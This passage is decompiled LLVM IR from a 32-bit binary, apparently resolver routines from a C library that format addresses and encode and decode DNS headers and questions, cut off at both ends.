  br i1 %v2_193ec, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_193ec
  %v4_193f4 = inttoptr i32 %v3_193f464 to i8*
  store i8 58, i8* %v4_193f4, align 1
  %v5_193f4 = load i32, i32* @r4, align 4
  %v6_193f4 = add i32 %v5_193f4, 1
  store i32 %v6_193f4, i32* @r4, align 4
  %v0_193f8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_193ec, %bb52
  %v0_19438 = phi i32 [ %v3_193f464, %dec_label_pc_193ec ], [ %v6_193f4, %bb52 ]
  %v1_1945c = phi i32 [ 0, %dec_label_pc_193ec ], [ %v0_193f8.pre, %bb52 ]
  %v7_193f8 = icmp eq i32 %v1_1945c, 6
  br i1 %v7_193f8, label %dec_label_pc_19400, label %dec_label_pc_19458

dec_label_pc_19400:                               ; preds = %.thread3
  %v0_19400 = load i32, i32* @r6, align 4
  %v2_19400 = icmp eq i32 %v0_19400, 0
  br i1 %v2_19400, label %dec_label_pc_19408, label %dec_label_pc_19458

dec_label_pc_19408:                               ; preds = %dec_label_pc_19400
  %v0_19408 = load i32, i32* @r7, align 4
  %v7_19408 = icmp eq i32 %v0_19408, 6
  br i1 %v7_19408, label %dec_label_pc_19428, label %dec_label_pc_19410

dec_label_pc_19410:                               ; preds = %dec_label_pc_19408
  %v7_19410 = icmp eq i32 %v0_19408, 5
  br i1 %v7_19410, label %dec_label_pc_19418, label %dec_label_pc_19458

dec_label_pc_19418:                               ; preds = %dec_label_pc_19410
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_19420, label %dec_label_pc_19428, label %dec_label_pc_19458

dec_label_pc_19428:                               ; preds = %dec_label_pc_19418, %dec_label_pc_19408
  %v2_1942c = sub i32 %v25_19298, %v0_19438
  %v0_19430 = load i32, i32* @r8, align 4
  %v1_19430 = add i32 %v0_19430, 12
  %v1_19434 = add i32 %v2_1942c, -32
  store i32 %v1_19434, i32* %r2.global-to-local, align 4
  store i32 %v0_19438, i32* %r1.global-to-local, align 4
  %v3_1943c = call i32 @inet_ntop4(i32 %v1_19430, i32 %v0_19438, i32 %v1_19434)
  %v2_19440 = icmp eq i32 %v3_1943c, 0
  br i1 %v2_19440, label %dec_label_pc_194cc, label %dec_label_pc_19448

dec_label_pc_19448:                               ; preds = %dec_label_pc_19428
  %v0_19448 = load i32, i32* @r4, align 4
  %v1_19448 = inttoptr i32 %v0_19448 to i8*
  %v3_1944c = call i32 @strlen(i8* %v1_19448)
  %v0_19450 = load i32, i32* @r4, align 4
  %v2_19450 = add i32 %v0_19450, %v3_1944c
  store i32 %v2_19450, i32* @r4, align 4
  %v0_19488.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19488

dec_label_pc_19458:                               ; preds = %dec_label_pc_19418, %dec_label_pc_19410, %dec_label_pc_19400, %.thread3
  %v4_1945c = mul i32 %v1_1945c, 4
  %v5_1945c = add i32 %v4_1945c, %v25_19298
  store i32 %v0_19438, i32* @r0, align 4
  %v1_19464 = add i32 %v5_1945c, -32
  %v2_19464 = inttoptr i32 %v1_19464 to i32*
  %v3_19464 = load i32, i32* %v2_19464, align 4
  store i32 %v3_19464, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_24f0c.1352 to i32), i32* %r1.global-to-local, align 4
  %v7_1946c = call i32 @sprintf(i32 %v0_19438, i32 ptrtoint ([3 x i8]* @global_var_24f0c.1352 to i32), i32 %v3_19464, i32 %v5_1945c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_19470 = load i32, i32* @r4, align 4
  %v2_19470 = add i32 %v0_19470, %v7_1946c
  store i32 %v2_19470, i32* @r4, align 4
  br label %dec_label_pc_19474

dec_label_pc_19474:                               ; preds = %dec_label_pc_193dc, %bb51, %dec_label_pc_19458
  %v3_193e424 = phi i32 [ %v3_193f464, %dec_label_pc_193dc ], [ %v6_193e4, %bb51 ], [ %v2_19470, %dec_label_pc_19458 ]
  %v0_19474 = load i32, i32* @r5, align 4
  %v1_19474 = add i32 %v0_19474, 1
  %v0_193c0.pre = load i32, i32* @r6, align 4
  store i32 %v1_19474, i32* @r5, align 4
  %v7_1947c = icmp slt i32 %v1_19474, 8
  %v7_193c0 = icmp eq i32 %v0_193c0.pre, -1
  br i1 %v7_1947c, label %dec_label_pc_193c0, label %dec_label_pc_19480

dec_label_pc_19480:                               ; preds = %dec_label_pc_19474
  br i1 %v7_193c0, label %.thread4, label %dec_label_pc_19488

dec_label_pc_19488:                               ; preds = %dec_label_pc_19480, %dec_label_pc_19448
  %v3_19494 = phi i32 [ %v3_193e424, %dec_label_pc_19480 ], [ %v2_19450, %dec_label_pc_19448 ]
  %v0_19488 = phi i32 [ %v0_193c0.pre, %dec_label_pc_19480 ], [ %v0_19488.pre, %dec_label_pc_19448 ]
  %v1_19488 = load i32, i32* @r7, align 4
  %v2_19488 = add i32 %v1_19488, %v0_19488
  %v7_1948c = icmp eq i32 %v2_19488, 8
  br i1 %v7_1948c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_19488
  %v4_19494 = inttoptr i32 %v3_19494 to i8*
  store i8 58, i8* %v4_19494, align 1
  %v5_19494 = load i32, i32* @r4, align 4
  %v6_19494 = add i32 %v5_19494, 1
  store i32 %v6_19494, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19488, %dec_label_pc_19480, %bb53
  %v2_1949c = phi i32 [ %v3_19494, %dec_label_pc_19488 ], [ %v3_193e424, %dec_label_pc_19480 ], [ %v6_19494, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1949c = inttoptr i32 %v2_1949c to i8*
  store i8 0, i8* %v3_1949c, align 1
  %v4_1949c = load i32, i32* @r4, align 4
  %v5_1949c = add i32 %v4_1949c, 1
  store i32 %v2_193b4, i32* %r1.global-to-local, align 4
  %v2_194a4 = sub i32 %v5_1949c, %v2_193b4
  %v1_194a8 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_194a4, %v1_194a8
  br i1 %tmp69, label %dec_label_pc_194b0, label %dec_label_pc_194c4

dec_label_pc_194b0:                               ; preds = %.thread4
  %v0_194b0 = call i32 @__errno_location()
  %v0_194b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_194b8, i32* %r2.global-to-local, align 4
  %v2_194bc = inttoptr i32 %v0_194b0 to i32*
  store i32 28, i32* %v2_194bc, align 4
  %v0_194e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_194e4

dec_label_pc_194c4:                               ; preds = %.thread4
  %v0_194c4 = load i32, i32* @sb, align 4
  %v2_194c8 = bitcast i32* %stack_var_-110 to i8*
  %v3_194c8 = call i32 @strcpy(i32 %v0_194c4, i8* %v2_194c8)
  br label %dec_label_pc_194cc

dec_label_pc_194cc:                               ; preds = %dec_label_pc_19428, %dec_label_pc_192c0, %dec_label_pc_194c4
  %v0_194cc = phi i32 [ 0, %dec_label_pc_19428 ], [ %v3_192cc, %dec_label_pc_192c0 ], [ %v3_194c8, %dec_label_pc_194c4 ]
  store i32 %v0_194cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_194e4

dec_label_pc_194d4:                               ; preds = %dec_label_pc_192b4
  %v0_194d4 = call i32 @__errno_location()
  %v2_194dc = inttoptr i32 %v0_194d4 to i32*
  store i32 97, i32* %v2_194dc, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_194e4

dec_label_pc_194e4:                               ; preds = %dec_label_pc_194cc, %dec_label_pc_194b0, %dec_label_pc_194d4
  %v0_194e4 = phi i32 [ %v0_194cc, %dec_label_pc_194cc ], [ %v0_194e4.pre, %dec_label_pc_194b0 ], [ 0, %dec_label_pc_194d4 ]
  store i32 %v6_19298, i32* %r5.global-to-local, align 4
  ret i32 %v0_194e4

; uselistorder directives
  uselistorder i1 %v7_193c0, { 1, 0 }
  uselistorder i32 %v0_193c0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_19474, { 1, 0, 2 }
  uselistorder i32 %v0_19438, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_193f464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_193dc65, { 2, 0, 1 }
  uselistorder i32 %v0_193ec66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_193b4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_193c023, { 1, 0 }
  uselistorder i32 %v0_193a4, { 1, 2, 0 }
  uselistorder i32 %v1_19378, { 1, 2, 0 }
  uselistorder i32 %v0_1938c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_193a0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_19340, { 1, 0 }
  uselistorder i32 %v0_19378, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1935c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1936c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_19310, { 2, 1, 0 }
  uselistorder i32 %v1_192f0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_19298, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 8, 7, 6, 9, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 11, 2, 3, 4, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 15, 12, 13, 14, 6, 26, 24, 20, 25, 7, 1, 2, 3, 4, 5, 8, 9, 10, 11, 16, 17, 18, 19, 23, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_194e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_194cc, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19474, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_193c0, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_193a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1939c, { 1, 0 }
  uselistorder label %dec_label_pc_19378, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_19374, { 1, 0 }
  uselistorder label %dec_label_pc_1932c, { 1, 0 }
  uselistorder label %dec_label_pc_19300, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_194fc = load i32, i32* @r4, align 4
  store i32 %v3_194fc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1950c = icmp sgt i32 %arg3, 11
  br i1 %v7_1950c, label %dec_label_pc_19510, label %dec_label_pc_195d8

dec_label_pc_19510:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_19510 = add i32 %tmp, 1
  %v2_19510 = inttoptr i32 %v1_19510 to i8*
  %v3_19510 = load i8, i8* %v2_19510, align 1
  store i8 %v3_19510, i8* %tmp18, align 1
  %v2_19518 = load i32, i32* %arg1, align 4
  %v1_1951c = trunc i32 %v2_19518 to i8
  %v4_1951c = add i32 %arg2, 1
  %v5_1951c = inttoptr i32 %v4_1951c to i8*
  store i8 %v1_1951c, i8* %v5_1951c, align 1
  %v0_19520 = load i32, i32* %lr.global-to-local, align 4
  %v1_19520 = add i32 %v0_19520, 12
  %v2_19520 = inttoptr i32 %v1_19520 to i32*
  %v3_19520 = load i32, i32* %v2_19520, align 4
  %v1_19524 = add i32 %v0_19520, 4
  %v2_19524 = inttoptr i32 %v1_19524 to i32*
  %v3_19524 = load i32, i32* %v2_19524, align 4
  %v1_19528 = add i32 %v0_19520, 16
  %v2_19528 = inttoptr i32 %v1_19528 to i32*
  %v3_19528 = load i32, i32* %v2_19528, align 4
  %v1_1952c = add i32 %tmp, 8
  %v2_1952c = inttoptr i32 %v1_1952c to i32*
  %v3_1952c = load i32, i32* %v2_1952c, align 4
  %v2_19530 = icmp eq i32 %v3_19520, 0
  %. = select i1 %v2_19530, i32 0, i32 4
  %v2_1953c = icmp eq i32 %v3_19524, 0
  %v1_19540 = add i32 %v0_19520, 20
  %v2_19540 = inttoptr i32 %v1_19540 to i32*
  %v3_19540 = load i32, i32* %v2_19540, align 4
  %storemerge12 = select i1 %v2_1953c, i32 0, i32 128
  %v1_1954c = urem i32 %v3_1952c, 16
  %v2_19550 = icmp eq i32 %v3_19528, 0
  %.29 = select i1 %v2_19550, i32 0, i32 2
  %v4_1955c = mul nuw nsw i32 %v1_1954c, 8
  %v5_1955c = or i32 %v4_1955c, %.
  %v2_19560 = icmp eq i32 %v3_19540, 0
  br i1 %v2_19560, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_19510
  %v2_19564 = or i32 %v5_1955c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_19510, %bb25
  %v1_1956c = phi i32 [ %v5_1955c, %dec_label_pc_19510 ], [ %v2_19564, %bb25 ]
  %v2_19568 = or i32 %.29, %storemerge12
  %v2_1956c = or i32 %v2_19568, %v1_1956c
  %v1_19570 = trunc i32 %v2_1956c to i8
  %v2_19570 = load i32, i32* %r4.global-to-local, align 4
  %v3_19570 = add i32 %v2_19570, 2
  %v4_19570 = inttoptr i32 %v3_19570 to i8*
  store i8 %v1_19570, i8* %v4_19570, align 1
  %v0_19574 = load i32, i32* %lr.global-to-local, align 4
  %v1_19574 = add i32 %v0_19574, 24
  %v1_19578 = inttoptr i32 %v1_19574 to i32*
  %v2_19578 = load i32, i32* %v1_19578, align 4
  %v3_19578 = add i32 %v0_19574, 28
  %v4_19578 = inttoptr i32 %v3_19578 to i32*
  %v5_19578 = load i32, i32* %v4_19578, align 4
  %v2_1957c = icmp eq i32 %v2_19578, 0
  %v1_19580 = urem i32 %v5_19578, 16
  %.30 = select i1 %v2_1957c, i32 0, i32 128
  %v2_1958c = or i32 %v1_19580, %.30
  %v1_19590 = trunc i32 %v2_1958c to i8
  %v2_19590 = load i32, i32* %r4.global-to-local, align 4
  %v3_19590 = add i32 %v2_19590, 3
  %v4_19590 = inttoptr i32 %v3_19590 to i8*
  store i8 %v1_19590, i8* %v4_19590, align 1
  %v0_19594 = load i32, i32* %lr.global-to-local, align 4
  %v1_19594 = add i32 %v0_19594, 33
  %v2_19594 = inttoptr i32 %v1_19594 to i8*
  %v3_19594 = load i8, i8* %v2_19594, align 1
  %v2_19598 = load i32, i32* %r4.global-to-local, align 4
  %v3_19598 = add i32 %v2_19598, 4
  %v4_19598 = inttoptr i32 %v3_19598 to i8*
  store i8 %v3_19594, i8* %v4_19598, align 1
  %v0_1959c = load i32, i32* %lr.global-to-local, align 4
  %v1_1959c = add i32 %v0_1959c, 32
  %v2_1959c = inttoptr i32 %v1_1959c to i32*
  %v3_1959c = load i32, i32* %v2_1959c, align 4
  %v1_195a0 = trunc i32 %v3_1959c to i8
  %v2_195a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_195a0 = add i32 %v2_195a0, 5
  %v4_195a0 = inttoptr i32 %v3_195a0 to i8*
  store i8 %v1_195a0, i8* %v4_195a0, align 1
  %v0_195a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_195a4 = add i32 %v0_195a4, 37
  %v2_195a4 = inttoptr i32 %v1_195a4 to i8*
  %v3_195a4 = load i8, i8* %v2_195a4, align 1
  %v2_195a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_195a8 = add i32 %v2_195a8, 6
  %v4_195a8 = inttoptr i32 %v3_195a8 to i8*
  store i8 %v3_195a4, i8* %v4_195a8, align 1
  %v0_195ac = load i32, i32* %lr.global-to-local, align 4
  %v1_195ac = add i32 %v0_195ac, 36
  %v2_195ac = inttoptr i32 %v1_195ac to i32*
  %v3_195ac = load i32, i32* %v2_195ac, align 4
  %v1_195b0 = trunc i32 %v3_195ac to i8
  %v2_195b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_195b0 = add i32 %v2_195b0, 7
  %v4_195b0 = inttoptr i32 %v3_195b0 to i8*
  store i8 %v1_195b0, i8* %v4_195b0, align 1
  %v0_195b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_195b4 = add i32 %v0_195b4, 41
  %v2_195b4 = inttoptr i32 %v1_195b4 to i8*
  %v3_195b4 = load i8, i8* %v2_195b4, align 1
  %v2_195b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_195b8 = add i32 %v2_195b8, 8
  %v4_195b8 = inttoptr i32 %v3_195b8 to i8*
  store i8 %v3_195b4, i8* %v4_195b8, align 1
  %v0_195bc = load i32, i32* %lr.global-to-local, align 4
  %v1_195bc = add i32 %v0_195bc, 40
  %v2_195bc = inttoptr i32 %v1_195bc to i32*
  %v3_195bc = load i32, i32* %v2_195bc, align 4
  %v1_195c0 = trunc i32 %v3_195bc to i8
  %v2_195c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_195c0 = add i32 %v2_195c0, 9
  %v4_195c0 = inttoptr i32 %v3_195c0 to i8*
  store i8 %v1_195c0, i8* %v4_195c0, align 1
  %v0_195c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_195c4 = add i32 %v0_195c4, 45
  %v2_195c4 = inttoptr i32 %v1_195c4 to i8*
  %v3_195c4 = load i8, i8* %v2_195c4, align 1
  %v2_195c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_195c8 = add i32 %v2_195c8, 10
  %v4_195c8 = inttoptr i32 %v3_195c8 to i8*
  store i8 %v3_195c4, i8* %v4_195c8, align 1
  %v0_195cc = load i32, i32* %lr.global-to-local, align 4
  %v1_195cc = add i32 %v0_195cc, 44
  %v2_195cc = inttoptr i32 %v1_195cc to i32*
  %v3_195cc = load i32, i32* %v2_195cc, align 4
  %v1_195d0 = trunc i32 %v3_195cc to i8
  %v2_195d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_195d0 = add i32 %v2_195d0, 11
  %v4_195d0 = inttoptr i32 %v3_195d0 to i8*
  store i8 %v1_195d0, i8* %v4_195d0, align 1
  %v2_195dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_195d8

dec_label_pc_195d8:                               ; preds = %entry, %bb26
  %v2_195dc = phi i32 [ %v3_194fc, %entry ], [ %v2_195dc.pre, %bb26 ]
  %v0_195d8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_195dc, i32* @r4, align 4
  ret i32 %v0_195d8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_195d8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_195e0 = load i8, i8* %arg1, align 1
  %v4_195e0 = zext i8 %v3_195e0 to i32
  %v2_195e4 = add i32 %tmp, 1
  %v3_195e4 = inttoptr i32 %v2_195e4 to i8*
  %v4_195e4 = load i8, i8* %v3_195e4, align 1
  %v5_195e4 = zext i8 %v4_195e4 to i32
  %v4_195e8 = mul nuw nsw i32 %v4_195e0, 256
  %v5_195e8 = or i32 %v5_195e4, %v4_195e8
  %v2_195ec = inttoptr i32 %arg2 to i32*
  store i32 %v5_195e8, i32* %v2_195ec, align 4
  %v2_195f0 = add i32 %tmp, 2
  %v3_195f0 = inttoptr i32 %v2_195f0 to i8*
  %v4_195f0 = load i8, i8* %v3_195f0, align 1
  %tmp4 = icmp slt i8 %v4_195f0, 0
  %v3_195f4 = zext i1 %tmp4 to i32
  %v2_195f8 = add i32 %arg2, 4
  %v3_195f8 = inttoptr i32 %v2_195f8 to i32*
  store i32 %v3_195f4, i32* %v3_195f8, align 4
  %v4_195fc = load i8, i8* %v3_195f0, align 1
  %div = udiv i8 %v4_195fc, 8
  %tmp5 = urem i8 %div, 16
  %v1_19604 = zext i8 %tmp5 to i32
  %v2_19608 = add i32 %arg2, 8
  %v3_19608 = inttoptr i32 %v2_19608 to i32*
  store i32 %v1_19604, i32* %v3_19608, align 4
  %v4_1960c = load i8, i8* %v3_195f0, align 1
  %div1 = udiv i8 %v4_1960c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_19614 = zext i8 %tmp6 to i32
  %v2_19618 = add i32 %arg2, 12
  %v3_19618 = inttoptr i32 %v2_19618 to i32*
  store i32 %v1_19614, i32* %v3_19618, align 4
  %v4_1961c = load i8, i8* %v3_195f0, align 1
  %div2 = udiv i8 %v4_1961c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_19624 = zext i8 %tmp7 to i32
  %v2_19628 = add i32 %arg2, 16
  %v3_19628 = inttoptr i32 %v2_19628 to i32*
  store i32 %v1_19624, i32* %v3_19628, align 4
  %v4_1962c = load i8, i8* %v3_195f0, align 1
  %tmp8 = urem i8 %v4_1962c, 2
  %v1_19630 = zext i8 %tmp8 to i32
  %v2_19634 = add i32 %arg2, 20
  %v3_19634 = inttoptr i32 %v2_19634 to i32*
  store i32 %v1_19630, i32* %v3_19634, align 4
  %v2_19638 = add i32 %tmp, 3
  %v3_19638 = inttoptr i32 %v2_19638 to i8*
  %v4_19638 = load i8, i8* %v3_19638, align 1
  %tmp9 = icmp slt i8 %v4_19638, 0
  %v3_1963c = zext i1 %tmp9 to i32
  %v2_19640 = add i32 %arg2, 24
  %v3_19640 = inttoptr i32 %v2_19640 to i32*
  store i32 %v3_1963c, i32* %v3_19640, align 4
  %v4_19644 = load i8, i8* %v3_19638, align 1
  %tmp10 = urem i8 %v4_19644, 16
  %v1_19648 = zext i8 %tmp10 to i32
  %v2_1964c = add i32 %arg2, 28
  %v3_1964c = inttoptr i32 %v2_1964c to i32*
  store i32 %v1_19648, i32* %v3_1964c, align 4
  %v2_19650 = add i32 %tmp, 4
  %v3_19650 = inttoptr i32 %v2_19650 to i8*
  %v4_19650 = load i8, i8* %v3_19650, align 1
  %v5_19650 = zext i8 %v4_19650 to i32
  %v2_19654 = add i32 %tmp, 5
  %v3_19654 = inttoptr i32 %v2_19654 to i8*
  %v4_19654 = load i8, i8* %v3_19654, align 1
  %v5_19654 = zext i8 %v4_19654 to i32
  %v4_19658 = mul nuw nsw i32 %v5_19650, 256
  %v5_19658 = or i32 %v5_19654, %v4_19658
  %v2_1965c = add i32 %arg2, 32
  %v3_1965c = inttoptr i32 %v2_1965c to i32*
  store i32 %v5_19658, i32* %v3_1965c, align 4
  %v2_19660 = add i32 %tmp, 6
  %v3_19660 = inttoptr i32 %v2_19660 to i8*
  %v4_19660 = load i8, i8* %v3_19660, align 1
  %v5_19660 = zext i8 %v4_19660 to i32
  %v2_19664 = add i32 %tmp, 7
  %v3_19664 = inttoptr i32 %v2_19664 to i8*
  %v4_19664 = load i8, i8* %v3_19664, align 1
  %v5_19664 = zext i8 %v4_19664 to i32
  %v4_19668 = mul nuw nsw i32 %v5_19660, 256
  %v5_19668 = or i32 %v5_19664, %v4_19668
  %v2_1966c = add i32 %arg2, 36
  %v3_1966c = inttoptr i32 %v2_1966c to i32*
  store i32 %v5_19668, i32* %v3_1966c, align 4
  %v2_19670 = add i32 %tmp, 8
  %v3_19670 = inttoptr i32 %v2_19670 to i8*
  %v4_19670 = load i8, i8* %v3_19670, align 1
  %v5_19670 = zext i8 %v4_19670 to i32
  %v2_19674 = add i32 %tmp, 9
  %v3_19674 = inttoptr i32 %v2_19674 to i8*
  %v4_19674 = load i8, i8* %v3_19674, align 1
  %v5_19674 = zext i8 %v4_19674 to i32
  %v4_19678 = mul nuw nsw i32 %v5_19670, 256
  %v5_19678 = or i32 %v5_19674, %v4_19678
  %v2_1967c = add i32 %arg2, 40
  %v3_1967c = inttoptr i32 %v2_1967c to i32*
  store i32 %v5_19678, i32* %v3_1967c, align 4
  %v2_19680 = add i32 %tmp, 11
  %v3_19680 = inttoptr i32 %v2_19680 to i8*
  %v4_19680 = load i8, i8* %v3_19680, align 1
  %v5_19680 = zext i8 %v4_19680 to i32
  %v2_19684 = add i32 %tmp, 10
  %v3_19684 = inttoptr i32 %v2_19684 to i8*
  %v4_19684 = load i8, i8* %v3_19684, align 1
  %v5_19684 = zext i8 %v4_19684 to i32
  %v4_1968c = mul nuw nsw i32 %v5_19684, 256
  %v5_1968c = or i32 %v4_1968c, %v5_19680
  %v2_19690 = add i32 %arg2, 44
  %v3_19690 = inttoptr i32 %v2_19690 to i32*
  store i32 %v5_1968c, i32* %v3_19690, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 12, 4, 5, 13, 14, 15, 16, 17, 0, 18, 19, 7, 20, 21, 8, 3, 2, 1, 24, 25 }
  uselistorder i32 40, { 10, 11, 3, 13, 1, 12, 2, 0, 4, 5, 6, 7, 8, 9, 14 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 22, 41, 37, 39, 8, 38, 1, 23, 18, 2, 34, 35, 24, 25, 26, 27, 28, 29, 0, 30, 17, 36, 19, 20, 21, 3, 4, 31, 13, 12, 10, 11, 14, 15, 9, 16, 40 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19698 = load i32, i32* @r4, align 4
  store i32 %v3_19698, i32* %stack_var_-16, align 4
  %v6_19698 = load i32, i32* @r5, align 4
  %v9_19698 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_196a0 = load i32, i32* %arg1, align 4
  store i32 %v2_196a0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_196ac = inttoptr i32 %v2_196a0 to i8*
  %v2_196ac = call i32 @__encode_dotted(i8* %v1_196ac)
  store i32 %v2_196ac, i32* %r0.global-to-local, align 4
  %v1_196b0 = icmp slt i32 %v2_196ac, 0
  br i1 %v1_196b0, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_196b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_196b8, i32* @r4, align 4
  store i32 %v6_19698, i32* @r5, align 4
  store i32 %v9_19698, i32* @r6, align 4
  ret i32 %v2_196ac

bb6:                                              ; preds = %entry
  %v1_196b4 = load i32, i32* @r4, align 4
  %v2_196b4 = sub i32 %v1_196b4, %v2_196ac
  %v0_196c0 = load i32, i32* @r6, align 4
  %v2_196c0 = add i32 %v0_196c0, %v2_196ac
  store i32 %v2_196c0, i32* %r2.global-to-local, align 4
  %v7_196c4 = icmp sgt i32 %v2_196b4, 3
  br i1 %v7_196c4, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_196c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_196c8, i32* @r4, align 4
  store i32 %v6_19698, i32* @r5, align 4
  store i32 %v9_19698, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_196cc = load i32, i32* @r5, align 4
  %v1_196cc = add i32 %v0_196cc, 5
  %v2_196cc = inttoptr i32 %v1_196cc to i8*
  %v3_196cc = load i8, i8* %v2_196cc, align 1
  %v5_196d0 = inttoptr i32 %v2_196c0 to i8*
  store i8 %v3_196cc, i8* %v5_196d0, align 1
  %v0_196d4 = load i32, i32* @r5, align 4
  %v1_196d4 = add i32 %v0_196d4, 4
  %v2_196d4 = inttoptr i32 %v1_196d4 to i32*
  %v3_196d4 = load i32, i32* %v2_196d4, align 4
  %v1_196d8 = trunc i32 %v3_196d4 to i8
  %v2_196d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_196d8 = add i32 %v2_196d8, 1
  %v4_196d8 = inttoptr i32 %v3_196d8 to i8*
  store i8 %v1_196d8, i8* %v4_196d8, align 1
  %v0_196dc = load i32, i32* @r5, align 4
  %v1_196dc = add i32 %v0_196dc, 9
  %v2_196dc = inttoptr i32 %v1_196dc to i8*
  %v3_196dc = load i8, i8* %v2_196dc, align 1
  %v2_196e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_196e0 = add i32 %v2_196e0, 2
  %v4_196e0 = inttoptr i32 %v3_196e0 to i8*
  store i8 %v3_196dc, i8* %v4_196e0, align 1
  %v0_196e4 = load i32, i32* @r5, align 4
  %v1_196e4 = add i32 %v0_196e4, 8
